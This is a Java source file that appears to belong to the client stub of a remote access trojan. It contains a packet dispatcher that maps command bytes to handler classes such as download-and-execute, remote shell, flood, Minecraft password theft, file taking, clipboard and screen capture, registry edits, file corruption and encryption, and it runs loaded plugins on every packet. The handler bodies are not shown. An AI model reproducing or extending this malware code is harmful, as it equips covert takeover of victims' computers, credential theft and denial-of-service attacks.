package com.redpois0n.stub.packets.incoming;

import java.util.HashMap;
import java.util.Set;

import com.redpois0n.Plugin;

public abstract class AbstractIncomingPacket {

	public static final HashMap<Byte, Class<? extends AbstractIncomingPacket>> packets = new HashMap<Byte, Class<? extends AbstractIncomingPacket>>();

	static {
		packets.clear();
		packets.put(/* "MSGBOX" */(byte) 10, PacketMSGBOX.class);
		packets.put(/* "DISCONNECT" */(byte) 11, Packet11Disconnect.class);
		packets.put(/* "GETSCREEN" */(byte) 12, PacketGETSCREEN.class);
		packets.put(/* "GETSCREENONCE" */(byte) 13, PacketGETSCREENONCE.class);
		packets.put(/* "VISITURL" */(byte) 14, Packet14VisitURL.class);
		packets.put(/* "LISTFILES" */(byte) 15, PacketLISTFILES.class);
		packets.put(/* "DELETEFILE" */(byte) 16, PacketDELETEFILE.class);
		packets.put(/* "DLRUNURL" */(byte) 17, Packet17DownloadExecute.class);
		packets.put(/* "UPDATE" */(byte) 18, Packet18Update.class);
		packets.put(/* "LISTPROCESS" */(byte) 19, PacketLISTPROCESS.class);
		packets.put(/* "KILLPROCESS" */(byte) 20, PacketKILLPROCESS.class);
		packets.put(/* "GETFILE" */(byte) 21, PacketGETFILE.class);
		packets.put(/* "FLOOD" */(byte) 22, PacketFLOOD.class);
		packets.put(/* "RUNCMD" */(byte) 23, Packet23RemoteShellStart.class);
		packets.put(/* "ENDCMD" */(byte) 24, PacketENDCMD.class);
		packets.put(/* "EXEC" */(byte) 25, Packet25RemoteShellExecute.class);
		packets.put(/* "EXECP" */(byte) 26, PacketEXECP.class);
		packets.put(/* "REFRESHINFO" */(byte) 27, Packet27RefreshSystemInfo.class);
		packets.put(/* "SHUTDOWN" */(byte) 28, Packet28ShutdownComputer.class);
		packets.put(/* "RESTART" */(byte) 29, Packet29RestartComputer.class);
		packets.put(/* "LOGOUT" */(byte) 30, Packet30LogoutComputer.class);
		packets.put(/* "SLEEPMODE" */(byte) 31, Packet31ComputerSleep.class);
		packets.put(/* "LOCK" */(byte) 32, Packet32LockComputer.class);
		packets.put(/* "GETRAM" */(byte) 33, PacketGETRAM.class);
		packets.put(/* "CUSTOMDL" */(byte) 34, PacketCUSTOMDL.class);
		packets.put(/* "SCRIPT" */(byte) 35, PacketSCRIPT.class);
		packets.put(/* "UNINSTALL" */(byte) 36, Packet36Uninstall.class);
		packets.put(/* "RESTARTC" */(byte) 37, Packet37RestartJavaProcess.class);
		packets.put(/* "REXEC" */(byte) 38, Packet38RunCommand.class);
		packets.put(/* "VISITURLMUCH" */(byte) 39, PacketVISITURLMUCH.class);
		packets.put(/* "THUMBNAIL" */(byte) 40, Packet40Thumbnail.class);
		packets.put(/* "DIR" */(byte) 41, PacketDIR.class);
		packets.put(/* "TAKEFILE" */(byte) 42, PacketTAKEFILE.class);
		packets.put(/* "MKDIR" */(byte) 43, PacketMKDIR.class);
		packets.put(/* "URLSOUND" */(byte) 44, PacketURLSOUND.class);
		packets.put(/* "RECONNECT" */(byte) 45, Packet45Reconnect.class);
		packets.put(/* "CMOUSE" */(byte) 46, PacketCMOUSE.class);
		packets.put(/* "RNTO" */(byte) 47, PacketRNTO.class);
		packets.put(/* "STARTCHAT" */(byte) 48, Packet48ChatStart.class);
		packets.put(/* "ENDCHAT" */(byte) 49, Packet49ChatEnd.class);
		packets.put(/* "MC" */(byte) 50, Packet50MinecraftPassword.class);
		packets.put(/* "CHAT" */(byte) 51, Packet51ChatMessage.class);
		packets.put(/* "LOG" */(byte) 52, PacketLOG.class);
		packets.put(/* "FIND" */(byte) 53, PacketFIND.class);
		packets.put(/* "EFIND" */(byte) 54, PacketEFIND.class);
		packets.put(/* "GETHOSTFI" */(byte) 55, PacketGETHOSTFI.class);
		packets.put(/* "UHOST" */(byte) 56, PacketUHOST.class);
		packets.put(/* "GETUT" */(byte) 57, PacketGETUT.class);
		packets.put(/* "NUDGE" */(byte) 58, Packet58NudgeChat.class);
		packets.put(/* "CBOARD" */(byte) 59, PacketCBOARD.class);
		packets.put(/* "RD" */(byte) 60, PacketRD.class);
		packets.put(/* "JVM" */(byte) 61, PacketJVM.class);
		packets.put(/* "IMGP" */(byte) 62, PacketIMGP.class);
		packets.put(/* "ZIP" */(byte) 63, PacketZIP.class);
		packets.put(/* "MD5" */(byte) 64, PacketMD5.class);
		packets.put(/* "BEEP" */(byte) 65, PacketBEEP.class);
		packets.put(/* "PIA" */(byte) 66, PacketPIA.class);
		packets.put(/* "CPIA" */(byte) 67, PacketCPIA.class);
		packets.put(/* "FZ" */(byte) 68, PacketFZ.class);
		packets.put(/* "PRINTER" */(byte) 69, PacketPRINTER.class);
		packets.put(/* "CORRUPT" */(byte) 70, PacketCORRUPT.class);
		packets.put(/* "LISTLAN" */(byte) 71, PacketLISTLAN.class);
		packets.put(/* "IPCONFIG" */(byte) 72, PacketIPCONFIG.class);
		packets.put(/* "GETPORTS" */(byte) 73, PacketGETPORTS.class);
		packets.put(/* "GC" */(byte) 74, PacketGC.class);
		packets.put(/* "SESRED" */(byte) 75, PacketSESRED.class);
		packets.put(/* "SPEECH" */(byte) 76, PacketSPEECH.class);
		packets.put(/* "LISTSER" */(byte) 77, PacketLISTSER.class);
		packets.put(/* "LISTSTARTUP" */(byte) 78, PacketLISTSTARTUP.class);
		packets.put(/* "REG" */(byte) 79, PacketREG.class);
		packets.put(/* "REGC" */(byte) 80, PacketREGC.class);
		packets.put(/* "LISTINSTALL" */(byte) 81, PacketLISTINSTALL.class);
		packets.put(/* "LISTAD" */(byte) 82, PacketLISTAD.class);
		packets.put(/* "SYSINFO" */(byte) 83, Packet83WinSysInfo.class);
		packets.put(/* "SO" */(byte) 84, PacketSO.class);
		packets.put(/* "LISTI" */(byte) 85, PacketLISTI.class);
		packets.put(/* "GETERRLOG" */(byte) 86, PacketGETERRLOG.class);
		packets.put(/* "DELERRLOG" */(byte) 87, PacketDELERRLOG.class);
		packets.put(/* "GETSCONFIG" */(byte) 88, PacketGETSCONFIG.class);
		packets.put(/* "LOADPLUGINS" */(byte) 89, PacketLOADPLUGINS.class);
		packets.put(/* "PROP" */(byte) 90, Packet90SystemProperties.class);
		packets.put(/* "M" */(byte) 91, PacketM.class);
		packets.put(/* "P" */(byte) 92, PacketP.class);
		packets.put(/* "R" */(byte) 93, PacketR.class);
		packets.put(/* "KP" */(byte) 94, PacketKP.class);
		packets.put(/* "KR" */(byte) 95, PacketKR.class);
		packets.put(/* "VAR" */(byte) 96, Packet96EnvironmentVariables.class);
		packets.put(/* "LOCALES" */(byte) 97, PacketLOCALES.class);
		packets.put(/* "QUICKDESKTOP" */(byte) 98, PacketQUICKDESKTOP.class);
		packets.put(/* "ENC" */(byte) 99, PacketENC.class);
	}

	public static final void execute(byte header) {
		try {
			for (Plugin p : Plugin.list) {
				p.methods.get("onpacket").invoke(p.instance, new Object[] { header });
			}

			AbstractIncomingPacket packet = null;
			Set<Byte> set = packets.keySet();
			for (byte str : set) {
				if (str == header) {
					packet = packets.get(str).newInstance();
					break;
				}
			}

			if (packet != null) {
				try {
					packet.read();
				} catch (Exception ex) {
					throw ex;
				}
			}
		} catch (Exception ex) {
			Exception ex1 = new Exception("Failed to handle packet " + header, ex);
			ex1.printStackTrace();
		}
	}

	public abstract void read() throws Exception;

}
